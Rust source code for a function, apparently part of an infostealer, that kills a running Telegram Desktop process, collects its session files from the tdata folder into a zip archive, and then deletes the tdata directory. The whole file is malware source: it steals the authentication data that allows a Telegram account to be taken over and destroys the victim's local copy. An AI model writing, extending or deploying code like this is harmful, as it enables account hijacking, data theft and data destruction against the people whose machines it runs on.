use crate::system::process::*;
use std::{fs::{self, File}, io::Write, path::PathBuf, str::FromStr};
use zip::{write::FileOptions, ZipWriter};
use walkdir::WalkDir;

pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, local_path: &PathBuf) -> Result<(), &'static str>{
    let telegram_proc_name = String::from_str("Telegram.exe").unwrap();
    let telegram_path_buf: PathBuf;
    match get_process_directory(&telegram_proc_name){
        Ok(dir) => {telegram_path_buf = dir;}
        Err(_) => {
            if telegram_path.exists(){
                telegram_path_buf = telegram_path.clone();
            }
            else{
                return Err("Telegram directory does not exist");
            }
        }
    }
    let telegram_path = telegram_path_buf;
    kill_proc_by_name(&telegram_proc_name);
    let file: File; 
    match File::create(telegram_zip_path){
        Ok(res) => {file = res;}
        Err(_) => {return Err("Telegram zip creation error");}
    };
    let mut zip_file = ZipWriter::new(file);
    let tdata_path: PathBuf;
    if telegram_path.to_str().unwrap().contains("WindowsApps"){
        let package_name: &str = telegram_path.file_name().unwrap().to_str().unwrap();
        let name_vector: Vec<&str> = package_name.split("_").collect();
        let package_name = name_vector[0].to_string() + "_" + name_vector[4];
        tdata_path = local_path.join("Packages").join(package_name).join("LocalCache").join("Roaming").join("Telegram Desktop UWP").join("tdata");
    }
    else{
        tdata_path = telegram_path.join("tdata");
    }
    let tdata_path_len = tdata_path.to_str().unwrap().len();
    for entry in WalkDir::new(&tdata_path) {
        let entry = entry.unwrap();
        let entry_path = entry.path();
        let entry_path_str = entry_path.to_str().unwrap().replace("\\", "/");
        if entry_path.is_file() && entry_path_str.ends_with("s"){
            let entry_path_str = entry_path_str[tdata_path_len+1..].to_string();
            if zip_file.start_file(&entry_path_str, FileOptions::default()).is_err(){
                continue;
            };
            let content: Vec<u8>;
            match fs::read(&entry_path){
                Ok(res) => {content = res}
                Err(_) => {return Err("Reading telegram session files error");}
            };
            match zip_file.write(&content){
                Ok(_) => {}
                Err(_) => {return Err("Telegram zip writing error");}
            };
        }
    }
    zip_file.finish().unwrap();
    let _ = fs::remove_dir_all(&tdata_path);
    return Ok(());
}